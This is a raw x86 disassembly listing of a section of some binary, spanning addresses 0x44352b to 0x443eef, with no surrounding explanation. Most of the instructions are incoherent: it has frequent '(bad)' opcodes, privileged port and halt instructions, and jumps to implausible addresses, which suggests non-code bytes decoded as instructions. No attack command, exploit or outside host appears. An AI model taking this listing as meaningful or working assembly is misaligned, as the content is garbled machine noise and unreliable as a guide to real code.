  44352b:	fwait
  44352c:	cmp    eax,0xfb79aa1
  443531:	hlt    
  443532:	add    al,0xe5
  443534:	call   0x644bafb
  443539:	(bad)  
  44353a:	jmp    DWORD PTR [edi-0x1a92bc82]
  443540:	ss xor al,0x59
  443543:	popa   
  443544:	aam    0x7
  443546:	add    eax,0xb5867ee7
  44354b:	repnz add esi,esp
  44354e:	lea    ebp,[ebx-0x6f]
  443551:	cmp    BYTE PTR [edi+eiz*8],cl
  443554:	add    ecx,DWORD PTR [edx-0xbfc18fa]
  44355a:	fisubr WORD PTR [edi+0xf]
  44355d:	jne    0x44359e
  44355f:	imul   eax,DWORD PTR [ecx],0x1c
  443562:	icebp  
  443563:	out    0x3,al
  443565:	hlt    
  443566:	push   edi
  443567:	jno    0x443504
  443569:	push   es
  44356a:	add    eax,0xd1c980e7
  44356f:	(bad)  
	...
  443589:	add    BYTE PTR [ecx+eax*8+0x65],ah
  44358d:	add    eax,0x11537edb
  443592:	hlt    
  443593:	add    al,0x66
  443595:	test   eax,0x3e6f124
  44359a:	jp     0x443578
  44359c:	xor    al,0x7c
  44359e:	mov    edi,0xf3d06e58
  4435a3:	lea    ebp,[ebp-0x48808701]
  4435a9:	pmuludq mm0,QWORD PTR [eax+esi*2]
  4435ad:	push   ds
  4435ae:	xchg   edx,eax
  4435af:	mov    WORD PTR [edi],ds
  4435b1:	push   esp
  4435b2:	inc    ecx
  4435b3:	test   BYTE PTR [esi],bh
  4435b5:	add    al,0xc0
  4435b7:	cmc    
  4435b8:	call   FWORD PTR [ecx-0x6e17bd46]
  4435be:	int3   
  4435bf:	pop    ebp
  4435c0:	stc    
  4435c1:	mov    dl,0x72
  4435c3:	inc    ecx
  4435c4:	add    al,0x6a
  4435c6:	xchg   edx,eax
  4435c7:	push   edi
  4435c8:	jl     0x4435d0
  4435ca:	call   0xe550:0x3460f7c3
  4435d1:	out    dx,al
  4435d2:	mov    WORD PTR [eax+0x4f7e924],fs
  4435d8:	add    BYTE PTR [edx+0x75],ah
  4435db:	mov    ch,0x13
  4435dd:	jmp    0x6fd0b7d9
  4435e2:	mov    esp,0x60e90000
  4435e7:	jnp    0x443649
  4435e9:	loop   0x4435e2
  4435eb:	add    al,0x48
  4435ed:	pusha  
	...
  443606:	add    BYTE PTR [esi-0x4c],dh
  443609:	adc    ebp,ecx
  44360b:	neg    esi
  44360d:	(bad)  
  44360e:	jno    0x443646
  443610:	or     BYTE PTR [edx-0x6a846b7],0xc1
  443617:	add    eax,0x29a6f96c
  44361c:	and    DWORD PTR [eax-0xe],0xfffffff7
  443620:	add    al,0x7d
  443622:	mov    ds:0x3593580d,eax
  443627:	in     al,0x4
  443629:	add    BYTE PTR [edx+0xe],dh
  44362c:	mov    cl,0x13
  44362e:	jmp    0x67e0b62a
  443633:	lods   al,BYTE PTR ds:[esi]
  443634:	add    BYTE PTR [eax],al
  443636:	jmp    0xfd98a931
  44363b:	test   DWORD PTR [eax*4-0xcbb91],0x8a80dee8
  443646:	lods   eax,DWORD PTR ds:[esi]
  443647:	push   eax
  443648:	push   edi
  443649:	stc    
  44364a:	add    BYTE PTR [ebx],bh
  44364c:	fcom   DWORD PTR [ebx]
  44364e:	xchg   DWORD PTR [ebx],edi
  443650:	add    BYTE PTR [edi+ebx*4],dl
  443653:	(bad)  
  443654:	(bad)  
  443655:	icebp  
  443656:	xchg   sp,ax
  443658:	hlt    
  443659:	xchg   BYTE PTR [edx+0x14580aa9],cl
  44365f:	or     eax,0xb8c8203
  443664:	dec    ebx
  443665:	or     eax,0xc4801d00
  44366a:	add    al,0x0
	...
  443684:	aaa    
  443685:	mov    dl,0x6
  443687:	mov    dh,0xdf
  443689:	push   ecx
  44368a:	cld    
  44368b:	push   cs
  44368c:	mov    ebx,0xe54d82b3
  443691:	in     al,dx
  443692:	mov    ecx,0x515c6988
  443697:	adc    al,0xcd
  443699:	add    al,BYTE PTR [edi]
  44369b:	mov    bh,0x9c
  44369d:	adc    BYTE PTR fs:[edx+ebx*2+0x0],0x5e
  4436a3:	mov    ecx,ebp
  4436a5:	mov    edi,edx
  4436a7:	mov    BYTE PTR [ebx+0x62],dl
  4436aa:	add    al,0x0
  4436ac:	int    0x43
  4436ae:	arpl   WORD PTR [ecx],ax
  4436b0:	push   ss
  4436b1:	les    eax,FWORD PTR [eax-0x7645aab3]
  4436b7:	in     al,dx
  4436b8:	sub    ch,0x7a
  4436bb:	les    ecx,FWORD PTR [ecx-0x76af497f]
  4436c1:	add    al,BYTE PTR [eax]
  4436c3:	add    al,BYTE PTR [edx+0x2ff39cf]
  4436c9:	in     eax,dx
  4436ca:	test   BYTE PTR [esi-0xb27],0xd6
  4436d1:	adc    DWORD PTR [esp+edx*1+0x5d],0x2
  4436d6:	adc    DWORD PTR [esi-0x6a6d3],0xfffffff4
  4436dd:	loop   0x443690
  4436df:	pop    es
  4436e0:	jge    0x4436b2
  4436e2:	jle    0x443740
  4436e4:	jmp    FWORD PTR [ebx-0x3]
  4436e7:	test   BYTE PTR [eax],al
	...
  443701:	cmp    dh,BYTE PTR [edi+eiz*1+0x7c0f3beb]
  443708:	pop    ebx
  443709:	xor    BYTE PTR [ecx+0x6bff3c8e],bh
  44370f:	std    
  443710:	out    0x65,eax
  443712:	stc    
  443713:	addr16 stc 
  443715:	mov    ebx,0xb1e37c92
  44371a:	sub    dh,BYTE PTR [ecx]
  44371c:	int3   
  44371d:	cmp    BYTE PTR [eax],dl
  44371f:	xor    esp,ecx
  443721:	xor    BYTE PTR [eax],ch
  443723:	xor    esp,ecx
  443725:	sub    BYTE PTR [esi+0x7c],dh
  443728:	lock jg 0x443708
  44372b:	add    BYTE PTR ds:0x8a786bf4,al
  443731:	mov    BYTE PTR [ebx-0x3],ch
  443734:	inc    DWORD PTR [edx+0x44]
  443737:	cmc    
  443738:	call   0x82b97e10
  44373d:	sbb    al,0x53
  44373f:	std    
  443740:	push   DWORD PTR [ecx-0x1b]
  443743:	jnp    0x44374c
  443745:	hlt    
  443746:	imul   ecx,ebx,0xffffffe7
  443749:	lods   eax,DWORD PTR ds:[esi]
  44374a:	xchg   ebp,eax
  44374b:	popa   
  44374c:	stc    
  44374d:	jns    0x443734
  44374f:	xor    eax,DWORD PTR ds:0xe7cd6bf4
  443755:	test   eax,0x77f96170
  44375a:	lahf   
  44375b:	clc    
  44375c:	mov    bh,0xe6
  44375e:	imul   edi,ebp,0xffffffff
  443761:	(bad)  
	...
  44377d:	add    ah,dh
  44377f:	pop    esi
  443780:	stos   DWORD PTR es:[edi],eax
  443781:	mov    BYTE PTR [eax],dl
  443783:	sub    eax,esp
  443785:	call   ecx
  443787:	add    al,0x66
  443789:	test   al,0x6e
  44378b:	(bad)  
  44378c:	in     al,dx
  44378d:	add    esi,esp
  44378f:	add    al,0xdc
  443791:	fdiv   st(4),st
  443793:	mov    ?,WORD PTR [edi+0xb]
  443796:	or     ebp,eax
  443798:	out    0xdd,al
  44379a:	rcr    BYTE PTR [eax+0x4f1e651],0xe7
  4437a1:	add    esp,DWORD PTR [edi+0x7cadda1c]
  4437a7:	cli    
  4437a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4437a9:	ret    
  4437aa:	and    ebx,edi
  4437ac:	gs test al,0x6e
  4437af:	(bad)  
  4437b0:	fadd   QWORD PTR [ebx]
  4437b2:	hlt    
  4437b3:	add    al,0x94
  4437b5:	xor    bh,ch
  4437b7:	mov    ss,WORD PTR [edi+0xd]
  4437ba:	rol    esp,0xe6
  4437bd:	fnstsw WORD PTR [eax-0x68]
  4437c0:	pop    ecx
  4437c1:	out    0xf9,al
  4437c3:	add    al,0xe7
  4437c5:	add    esp,DWORD PTR [edi+0x15]
  4437c8:	pop    bx
  4437ca:	clc    
  4437cb:	xchg   edi,ebx
  4437cd:	add    bl,BYTE PTR [edi-0x6b]
  4437d0:	fs mov bh,0x13
  4437d3:	mul    bh
  4437d5:	jne    0x443773
  4437d7:	sti    
  4437d8:	out    0x3,al
  4437da:	push   ds
  4437db:	dec    eax
  4437dc:	das    
  4437dd:	jns    0x443807
  4437df:	(bad)
	...
  4437fa:	add    BYTE PTR [esi-0x63],bh
  4437fd:	rol    DWORD PTR [ebx],1
  4437ff:	hlt    
  443800:	mov    dl,0xa5
  443802:	or     BYTE PTR [edi+eax*1-0xa244894],0xe7
  44380a:	jne    0x443868
  44380c:	sti    
  44380d:	out    0x3,al
  44380f:	cs dec eax
  443811:	pop    bx
  443813:	add    DWORD PTR [ecx+0x5eac42b],0xf78f6700
  44381d:	(bad)  
  44381e:	call   0x3610c954
  443823:	sub    eax,DWORD PTR [ecx-0x34]
  443826:	sub    eax,0xbccc4123
  44382b:	into   
  44382c:	pusha  
  44382d:	test   DWORD PTR [edi+ecx*2-0xe7a7777],esp
  443834:	add    al,0x0
  443836:	push   0xffffffc8
  443838:	(bad)  
  443839:	jns    0x4437fb
  44383b:	inc    esi
  44383c:	mov    dh,0x84
  44383e:	mov    ah,0xfb
  443840:	out    0x84,al
  443842:	aas    
  443843:	inc    ecx
  443844:	inc    ecx
  443845:	fidiv  WORD PTR [edx+0x5f]
  443848:	or     al,0x62
  44384a:	loopne 0x4438b3
  44384c:	lea    edx,[edx]
  44384e:	jmp    0x61f6364a
  443853:	dec    edi
  443854:	idiv   edi
  443856:	call   0x6157ecd9
  44385b:	sti    
  44385c:	add    ecx,DWORD PTR [ecx]
  44385e:	aaa    
	...
  443877:	add    BYTE PTR [edi-0x65],bh
  44387a:	adc    ch,cl
  44387c:	test   DWORD PTR [ebp+0x40],0x13bd5cf5
  443883:	bound  ebp,QWORD PTR [eax-0x191277f5]
  443889:	mov    DWORD PTR [eax+0x4f285],edx
  44388f:	mov    esi,0xd9aef7b0
  443894:	or     eax,0x429a624b
  443899:	mov    cl,BYTE PTR [ebx-0x7]
  44389c:	je     0x443830
  44389e:	in     eax,dx
  44389f:	jo     0x443821
  4438a1:	nop
  4438a2:	adc    ch,cl
  4438a4:	test   DWORD PTR [ecx-0x755622ad],0x33500b0
  4438ae:	add    BYTE PTR [eax],al
  4438b0:	fstp   TBYTE PTR ds:0xbd750163
  4438b6:	repnz (bad) 
  4438b8:	fiadd  DWORD PTR [ebp-0x3bc7fb3c]
  4438be:	pop    ebp
  4438bf:	mov    esp,DWORD PTR [eax-0x402ca1fd]
  4438c5:	test   DWORD PTR [ecx-0x442f2bfd],edi
  4438cb:	push   ss
  4438cc:	dec    ebp
  4438cd:	pop    es
  4438ce:	or     DWORD PTR [ebp+0x1d],0x31
  4438d2:	add    dl,BYTE PTR [eax+0x2a5]
  4438d8:	xchg   esi,eax
  4438d9:	inc    ebx
  4438da:	add    eax,0x6a
	...
  4438f3:	add    BYTE PTR [eax],al
  4438f5:	or     al,0xaf
  4438f7:	test   eax,0x7ae9fafb
  4438fc:	les    esp,FWORD PTR [ecx]
  4438fe:	dec    edx
  4438ff:	mov    esp,0xcc0ce9cc
  443904:	int3   
  443905:	leave  
  443906:	or     al,0xcc
  443908:	int3   
  443909:	leave  
  44390a:	or     al,0xcc
  44390c:	int3   
  44390d:	nop
  44390e:	int    0xeb
  443910:	mov    edx,DWORD PTR [eax-0x7e16a9b2]
  443916:	fdivr  st(6),st
  443918:	dec    DWORD PTR [ecx+0x10cccc1a]
  44391e:	int3   
  44391f:	jmp    0x443972
  443921:	push   cs
  443922:	int3   
  443923:	push   esp
  443924:	adc    bl,ah
  443926:	retf   
  443927:	ins    BYTE PTR es:[edi],dx
  443928:	or     BYTE PTR [esi-0x58],cl
  44392b:	test   BYTE PTR [eax],al
  44392d:	popf   
  44392e:	push   es
  44392f:	add    BYTE PTR [edi+0x52],dl
  443932:	xchg   ebx,eax
  443933:	cmc    
  443934:	add    BYTE PTR [ebp-0x2181fffa],cl
  44393a:	retf   
  44393b:	xor    eax,0x17faf483
  443940:	inc    BYTE PTR [eax]
  443942:	fs push ebp
  443944:	bnd jge 0x4438d2
  443947:	xchg   DWORD PTR fs:[ebx],esi
  44394a:	inc    eax
  44394b:	jb     0x4438cf
  44394d:	or     al,0x67
  44394f:	std    
  443950:	inc    esp
  443952:	sub    DWORD PTR [esp+edi*8],0x63
  443956:	jmp    0x4439c9
  443958:	mov    al,BYTE PTR [eax]
	...
  443972:	adc    BYTE PTR [edi-0x3],dl
  443975:	jmp    DWORD PTR [ebp+0x4bfc17c3]
  44397b:	ret    
  44397c:	jg     0x443942
  44397e:	in     al,dx
  44397f:	(bad)  
  443980:	cmp    ch,al
  443982:	adc    eax,0x7ff96412
  443987:	mov    dl,0x94
  443989:	adc    dh,ah
  44398b:	pop    ebx
  44398c:	js     0x443918
  44398e:	push   eax
  44398f:	push   edx
  443990:	std    
  443991:	push   DWORD PTR [edi+0x1e]
  443994:	idiv   DWORD PTR [ebp+esi*1+0x66]
  443998:	ds out 0xf7,al
  44399b:	sbb    al,0x56
  44399d:	std    
  44399e:	ins    BYTE PTR es:[edi],dx
  44399f:	mov    eax,ds:0xdb2e3561
  4439a4:	sti    
  4439a5:	in     al,0xf7
  4439a7:	call   0xecc33c63
  4439ac:	jno    0x4439eb
  4439ae:	clc    
  4439af:	es inc edx
  4439b1:	jno    0x4439b2
  4439b3:	(bad)  
  4439b4:	(bad)  
  4439b5:	or     edi,DWORD PTR [ecx-0x65]
  4439b8:	fcom   DWORD PTR [ebx]
  4439ba:	jg     0x44397c
  4439bc:	not    DWORD PTR [eax+0x27]
  4439bf:	in     al,dx
  4439c0:	mov    ch,0xe7
  4439c2:	test   DWORD PTR [ecx-0x608806a3],edx
  4439c8:	hlt    
  4439c9:	out    0x38,al
  4439cb:	pop    ebp
  4439cc:	std    
  4439cd:	push   DWORD PTR [edi+0x4]
  4439d0:	popa   
  4439d1:	mov    esp,?
  4439d3:	add    al,0xe7
  4439d5:	pop    es
	...
  4439ee:	add    ch,bh
  4439f0:	mov    BYTE PTR [esp+eax*1-0xc],bl
  4439f4:	add    al,0xce
  4439f6:	dec    ebp
  4439f7:	in     eax,dx
  4439f8:	mov    BYTE PTR [esp+eax*1-0xc],dl
  4439fc:	add    al,0x6e
  4439fe:	xchg   edx,eax
  4439ff:	mov    al,0xfa
  443a01:	out    0x3,al
  443a03:	jno    0x4439d4
  443a05:	rcl    BYTE PTR [eax+0x5d6608c5],cl
  443a0b:	out    dx,eax
  443a0c:	shl    BYTE PTR [ecx+ebp*8+0x36c94678],cl
  443a13:	push   esp
  443a14:	jge    0x4439af
  443a16:	not    ebp
  443a18:	sti    
  443a19:	push   0xe704e69c
  443a1e:	adc    ah,BYTE PTR [esi+0x72]
  443a21:	outs   dx,DWORD PTR ds:[esi]
  443a22:	cli    
  443a23:	sub    edx,DWORD PTR [ecx+0x5e]
  443a26:	retf   0x7cfb
  443a29:	add    eax,DWORD PTR ds:0x12f2ca1d
  443a2f:	inc    esi
  443a30:	jb     0x443a82
  443a32:	cli    
  443a33:	or     edx,DWORD PTR [ecx+0x5e]
  443a36:	retf   0x7de7
  443a39:	mov    cl,0xb
  443a3b:	ins    BYTE PTR es:[edi],dx
  443a3c:	lock out dx,al
  443a3e:	mov    ?,WORD PTR [esi-0x6f]
  443a41:	fld    DWORD PTR [ebx]
  443a43:	hlt    
  443a44:	dec    edi
  443a45:	mov    eax,ds:0xcf592f7
  443a4a:	dec    esp
  443a4b:	push   esi
  443a4c:	xor    al,0xcd
  443a4e:	xchg   BYTE PTR [esp+edx*2+0x8960],dh
	...
  443a69:	add    BYTE PTR [eax],al
  443a6b:	add    BYTE PTR [eax+0x5603e6f7],cl
  443a71:	jle    0x443acc
  443a73:	fwait
  443a74:	out    0x4,al
  443a76:	out    0x6e,eax
  443a78:	add    edi,esp
  443a7a:	call   FWORD PTR [ecx+0x5706e311]
  443a80:	jg     0x443a75
  443a82:	(bad)  
  443a83:	call   0x7041cafa
  443a88:	gs xchg ecx,eax
  443a8a:	adc    ch,cl
  443a8c:	test   DWORD PTR [ecx+0x7b728d43],0x4f7f228
  443a96:	test   DWORD PTR [edi+0x73],edx
  443a99:	or     DWORD PTR [eax],eax
  443a9b:	jmp    0x1882fad7
  443aa0:	cmp    al,dl
  443aa2:	out    0x9d,eax
  443aa4:	ror    DWORD PTR [ebp-0x7],0x6c
  443aa8:	jge    0x443b27
  443aaa:	pop    es
  443aab:	jmp    0x5fceefa7
  443ab0:	retf   
  443ab1:	add    al,0x0
  443ab3:	jmp    0x5206c438
  443ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443ab9:	pop    eax
  443aba:	stc    
  443abb:	ss jb  0x443b07
  443abe:	adc    al,0x40
  443ac0:	jno    0x443ac7
  443ac2:	add    cl,ch
  443ac4:	push   0x7b
  443ac6:	mov    esp,0x8504f7f7
  443acb:	xchg   esp,eax
  443acc:	add    edi,DWORD PTR [ebx+0x41]
  443acf:	jmp    0x443ad1
	...
  443ae9:	jp     0x443b43
  443aeb:	or     eax,DWORD PTR [edi+0x1984e641]
  443af1:	fld    QWORD PTR [eax-0x22]
  443af4:	(bad)  
  443af5:	(bad)
  443af8:	loopne 0x443b57
  443afa:	lea    edx,[edx]
  443afc:	jmp    0x7ff638f8
  443b01:	jo     0x443af5
  443b03:	(bad)  
  443b04:	call   0x614bed81
  443b09:	hlt    
  443b0a:	(bad)  
  443b0b:	clc    
  443b0c:	add    BYTE PTR [ebx],cl
  443b0e:	dec    ebp
  443b0f:	or     BYTE PTR [esi+0xe6c53],dh
  443b15:	popf   
  443b16:	add    BYTE PTR [esi+0x14],0x16
  443b1a:	mov    eax,DWORD PTR [ecx]
  443b1c:	mov    cl,dh
  443b1e:	push   ebx
  443b1f:	test   BYTE PTR [esi-0x6b4cf],dl
  443b25:	bound  edi,QWORD PTR [edx]
  443b27:	or     eax,0xc2217db1
  443b2c:	pop    si
  443b2e:	loopne 0x443baa
  443b30:	ret    0x7bee
  443b33:	mov    ?,WORD PTR [ebx+ecx*2-0x2b99fffd]
  443b3a:	jp     0x443af4
  443b3c:	push   ss
  443b3d:	dec    ebp
  443b3e:	add    esp,ebx
  443b40:	adc    edi,DWORD PTR [ebx]
  443b42:	sbb    al,ah
  443b44:	push   sp
  443b46:	jge    0x443b00
  443b48:	push   ss
  443b49:	dec    ebp
  443b4a:	add    edi,DWORD PTR [ebx-0x3f]
	...
  443b65:	add    BYTE PTR [esi+0x7a],cl
  443b68:	xchg   BYTE PTR [ebx+ecx*2+0x65680003],bh
  443b6f:	cmp    edi,DWORD PTR [ecx]
  443b71:	add    BYTE PTR ds:0xd403aab,dh
  443b77:	cmp    BYTE PTR [esi-0x9488218],0xff
  443b7e:	sahf   
  443b7f:	mov    esp,0xe0cb8b07
  443b84:	cmp    eax,0x7ce5f2e8
  443b89:	jmp    FWORD PTR [ecx-0x3]
  443b8c:	add    dh,0xf5
  443b8f:	out    dx,eax
  443b90:	lock call edx
  443b93:	inc    ebp
  443b94:	push   edi
  443b95:	pop    ebx
  443b96:	out    0x54,ax
  443b99:	ret    
  443b9a:	mov    eax,ds:0xf4cccbbe
  443b9f:	adc    BYTE PTR [ebx+0xbf16fec],cl
  443ba5:	dec    ebp
  443ba6:	outs   dx,DWORD PTR ds:[esi]
  443ba7:	sub    esp,esi
  443ba9:	push   eax
  443baa:	jg     0x443bf1
  443bac:	ds jmp 0xf9a218b6
  443bb2:	mov    ds:0x9f7cfd5c,eax
  443bb7:	pop    ebp
  443bb8:	shr    BYTE PTR [edi+edi*2],cl
  443bbb:	sub    DWORD PTR [eax],edx
  443bbd:	or     DWORD PTR [edx+0x4c],eax
  443bc0:	add    al,0xc6
  443bc2:	jne    0x443c39
  443bc4:	dec    esi
  443bc5:	stc    
  443bc6:	hlt    
  443bc7:	pop    ebx
  443bc8:	rol    DWORD PTR [ecx],cl
	...
  443be2:	add    BYTE PTR [ebp+0x75],dh
  443be5:	dec    esi
  443be6:	stc    
  443be7:	hlt    
  443be8:	pop    ebx
  443be9:	add    al,0xf7
  443beb:	jne    0x443bcc
  443bed:	dec    ebp
  443bee:	stc    
  443bef:	hlt    
  443bf0:	pop    ebx
  443bf1:	rol    DWORD PTR [ecx],cl
  443bf3:	jne    0x443bb4
  443bf5:	dec    ebp
  443bf6:	stc    
  443bf7:	hlt    
  443bf8:	pop    ebx
  443bf9:	mov    ecx,es
  443bfb:	xor    eax,0xef58ecbc
  443c00:	sbb    al,0xbc
  443c02:	pop    edx
  443c03:	ss pusha 
  443c05:	std    
  443c06:	push   ecx
  443c07:	jg     0x443b9a
  443c09:	or     DWORD PTR [ebx-0x74f466d6],eax
  443c0f:	mov    dl,0x5c
  443c11:	mov    edi,0x4390af58
  443c16:	or     al,0xf4
  443c18:	ficomp DWORD PTR [ebx+0x10]
  443c1b:	xchg   DWORD PTR [edx+0x2980d582],ebx
  443c21:	mov    ah,BYTE PTR [eax+ebx*1-0xb0002a4]
  443c28:	xchg   di,ax
  443c2a:	add    dh,bh
  443c2c:	and    eax,edi
  443c2e:	cld    
  443c2f:	fadd   QWORD PTR [esi+ebp*1]
  443c32:	fld    st(6)
  443c34:	and    eax,0x55
  443c37:	int    0x4
  443c39:	out    0xd1,eax
  443c3b:	cmc    
  443c3c:	add    eax,0x55
  443c3f:	mov    ebp,0x239be704
  443c44:	test   edx,esp
  443c46:	add    DWORD PTR [eax],0x0
	...
  443c5d:	add    BYTE PTR [eax],al
  443c5f:	add    BYTE PTR [ebp-0x1295579b],ah
  443c65:	jns    0x443c0c
  443c67:	inc    ebp
  443c68:	xchg   esp,eax
  443c69:	or     dh,cl
  443c6b:	inc    ecx
  443c6c:	xchg   ecx,eax
  443c6d:	inc    esi
  443c6e:	cmp    DWORD PTR [ebp-0x6c],eax
  443c71:	hlt    
  443c72:	xor    DWORD PTR [ebx],ecx
  443c74:	inc    ebx
  443c75:	test   eax,0x4e8422b
  443c7a:	push   0xe6f7a45b
  443c7f:	add    edi,ebp
  443c81:	adc    BYTE PTR [ebp+0x2f04f404],0xaf
  443c88:	xchg   ebx,eax
  443c89:	faddp  st(0),st
  443c8b:	push   esi
  443c8c:	xor    DWORD PTR [ebx+0x4d],eax
  443c8f:	or     esi,DWORD PTR [ebx-0x49]
  443c92:	loop   0x443c18
  443c94:	pop    ecx
  443c95:	xchg   esp,eax
  443c96:	hlt    
  443c97:	add    esi,esp
  443c99:	mov    WORD PTR [esi+0x6c04f404],ds
  443c9f:	call   0x9626417b
  443ca4:	push   es
  443ca5:	add    bl,BYTE PTR ds:0xe7b6660f
  443cab:	add    cl,BYTE PTR [ebx]
  443cad:	add    DWORD PTR ds:0xe4b6460f,ebp
  443cb3:	add    cl,BYTE PTR [ebx]
  443cb5:	add    DWORD PTR ds:0xe5b6460f,ebx
  443cbb:	add    ch,bl
  443cbd:	or     BYTE PTR ds:0xffb3a60f,ch
  443cc3:	in     al,dx
	...
  443cdc:	add    dh,dh
  443cde:	push   ebx
  443cdf:	std    
  443ce0:	and    ch,bl
  443ce2:	xchg   esi,eax
  443ce3:	push   edx
  443ce4:	in     al,dx
  443ce5:	not    BYTE PTR [ebx-0x3]
  443ce8:	mov    dl,0xfa
  443cea:	xchg   esi,eax
  443ceb:	push   edx
  443cec:	out    dx,eax
  443ced:	not    BYTE PTR [ebx-0x3]
  443cf0:	mov    ds:0xee5296ea,al
  443cf5:	not    BYTE PTR [ebx-0x3]
  443cf8:	mov    dl,0xfa
  443cfa:	xchg   esi,eax
  443cfb:	push   edx
  443cfc:	loope  0x443cf4
  443cfe:	push   ebx
  443cff:	std    
  443d00:	mov    ds:0xf05296ea,al
  443d05:	not    BYTE PTR [ebx-0x3]
  443d08:	mov    dl,0xfa
  443d0a:	xchg   esi,eax
  443d0b:	push   edx
  443d0c:	jecxz  0x443d04
  443d0e:	push   ebx
  443d0f:	std    
  443d10:	mov    ds:0xf25296ea,al
  443d15:	not    BYTE PTR [ebx-0x3]
  443d18:	mov    dl,0xfa
  443d1a:	xchg   esi,eax
  443d1b:	push   edx
  443d1c:	in     eax,0xf6
  443d1e:	push   ebx
  443d1f:	std    
  443d20:	mov    ds:0xf45296ea,al
  443d25:	not    BYTE PTR [ebx-0x3]
  443d28:	xor    bh,dl
  443d2a:	xchg   esi,eax
  443d2b:	push   edx
  443d2c:	out    0xf6,eax
  443d2e:	push   ebx
  443d2f:	std    
  443d30:	and    ch,dl
  443d32:	xchg   esi,eax
  443d33:	push   edx
  443d34:	div    dh
  443d36:	push   ebx
  443d37:	std    
  443d38:	xor    dh,dh
  443d3a:	push   ebx
  443d3b:	jge    0x443d6c
  443d3d:	daa    
  443d3e:	les    ecx,FWORD PTR [eax]
  443d40:	add    BYTE PTR fs:[eax],al
	...
  443d57:	add    BYTE PTR [eax],al
  443d59:	add    BYTE PTR [edx+0x4d],al
  443d5c:	stc    
  443d5d:	outs   dx,DWORD PTR es:[esi]
  443d5f:	fdivr  QWORD PTR [edi-0x1a]
  443d62:	ja     0x443dba
  443d64:	fild   QWORD PTR [eax]
  443d66:	(bad)  
  443d67:	std    
  443d68:	cmp    bp,dx
  443d6b:	add    al,0xf9
  443d6d:	add    dl,bh
  443d6f:	push   es
  443d70:	ret    0x6cb8
  443d73:	mov    bh,bh
  443d75:	jg     0x443d59
  443d77:	loope  0x443d31
  443d79:	jmp    0xa8dd:0xfcb58ba
  443d80:	test   BYTE PTR [ebx],0xd7
  443d83:	test   eax,0x82da0c44
  443d88:	xor    edi,edi
  443d8a:	stos   BYTE PTR es:[edi],al
  443d8b:	test   eax,0x83aadb7c
  443d90:	leave  
  443d91:	add    BYTE PTR [ebp-0x420484f9],bl
  443d97:	clc    
  443d98:	jns    0x443d2f
  443d9a:	lea    eax,[edi]
  443d9c:	add    BYTE PTR [ebx+0x4e7c75e],cl
  443da2:	sbb    BYTE PTR [ebp+0x1d],bl
  443da5:	add    BYTE PTR [edx+0x57030e71],bl
  443dab:	stc    
  443dac:	lods   eax,DWORD PTR ds:[esi]
  443dad:	push   esi
  443dae:	pop    esp
  443daf:	add    al,0xf1
  443db1:	add    esp,DWORD PTR [edi+0x4f56adf9]
  443db7:	add    al,0xf1
  443db9:	add    edx,DWORD PTR [edi+0x56adf9]
	...
  443dd7:	pop    esi
  443dd8:	add    al,0xf1
  443dda:	add    eax,DWORD PTR [edi]
  443ddc:	cli    
  443ddd:	lods   eax,DWORD PTR ds:[esi]
  443dde:	push   esi
  443ddf:	push   ecx
  443de0:	add    al,0xf1
  443de2:	add    edx,DWORD PTR [edi]
  443de4:	cli    
  443de5:	lods   eax,DWORD PTR ds:[esi]
  443de6:	push   esi
  443de7:	and    BYTE PTR [ecx+esi*8],al
  443dea:	add    esp,edi
  443dec:	stc    
  443ded:	lods   eax,DWORD PTR ds:[esi]
  443dee:	push   esi
  443def:	adc    eax,DWORD PTR [ecx+esi*8]
  443df2:	add    edx,edi
  443df4:	stc    
  443df5:	lods   eax,DWORD PTR ds:[esi]
  443df6:	push   esi
  443df7:	and    al,BYTE PTR [ecx+esi*8]
  443dfa:	add    eax,edi
  443dfc:	stc    
  443dfd:	lods   eax,DWORD PTR ds:[esi]
  443dfe:	push   esi
  443dff:	hlt    
  443e00:	gs add bh,dh
  443e03:	mul    DWORD PTR [edi]
  443e05:	or     esi,DWORD PTR [edx-0x8ffaab6]
  443e0b:	not    DWORD PTR ds:0x664ab20b
  443e11:	add    bh,dh
  443e13:	mul    DWORD PTR ds:0x572ab20b
  443e19:	add    bh,dh
  443e1b:	not    DWORD PTR [ebp+0x602ab20c]
  443e21:	add    bh,dh
  443e23:	mul    DWORD PTR [ebp+0x514ab20c]
  443e29:	add    bh,dh
  443e2b:	not    DWORD PTR [ebp+0x624ab20c]
  443e31:	add    bh,dh
  443e33:	mul    DWORD PTR [ebp+0x532ab20c]
  443e39:	add    bh,dh
	...
  443e53:	add    bh,dh
  443e55:	xchg   ebp,eax
  443e56:	and    ch,0xe4
  443e59:	pop    esi
  443e5a:	push   esi
  443e5b:	jge    0x443e0f
  443e5d:	dec    esp
  443e5e:	lds    ecx,FWORD PTR [eax]
  443e60:	jns    0x443eaa
  443e62:	pop    esp
  443e63:	stc    
  443e64:	imul   esp,ecx,0x37
  443e67:	je     0x443e58
  443e69:	bound  edx,QWORD PTR [ebx-0x3c5c08fe]
  443e6f:	cld    
  443e70:	dec    esp
  443e71:	xchg   edi,eax
  443e72:	shl    dl,cl
  443e74:	mov    WORD PTR ds:0xab74017d,gs
  443e7a:	pop    ebp
  443e7b:	mov    edi,0xcde62b4e
  443e80:	add    ebx,DWORD PTR [esp+ebx*2-0x7]
  443e84:	not    DWORD PTR ds:0x5b746f95
  443e8a:	jge    0x443e7d
  443e8c:	adc    ebx,DWORD PTR ds:0x49d0967
  443e92:	xor    eax,0x1a49f40c
  443e97:	add    BYTE PTR [edx],cl
  443e99:	jle    0x443ec5
  443e9b:	mov    ebp,0xbcf7653a
  443ea0:	clc    
  443ea1:	inc    ebx
  443ea2:	sahf   
  443ea3:	mov    esi,0x4fe6f8a9
  443ea8:	mov    al,0x38
  443eaa:	pushf  
  443eab:	mov    al,cl
  443ead:	mov    dl,0x5d
  443eaf:	(bad)  
  443eb0:	add    eax,DWORD PTR [eax+0x7dfad0d9]
  443eb6:	sub    al,0xc
	...
  443ed0:	add    BYTE PTR [ecx-0x41],bh
  443ed3:	loop   0x443f03
  443ed5:	lods   al,BYTE PTR ds:[esi]
  443ed6:	jle    0x443ecf
  443ed8:	mov    ecx,DWORD PTR [eax]
  443eda:	add    al,0x27
  443edc:	retf   0x5226
  443edf:	sbb    DWORD PTR [ecx-0x70e3c7a0],edi
  443ee5:	mov    BYTE PTR [ebp+0x1c],bh
  443ee8:	or     BYTE PTR [edi+0x3b],dh
  443eeb:	sbb    ecx,DWORD PTR [ecx]
  443eed:	jno    0x443eae
  443eef:	out    dx,al
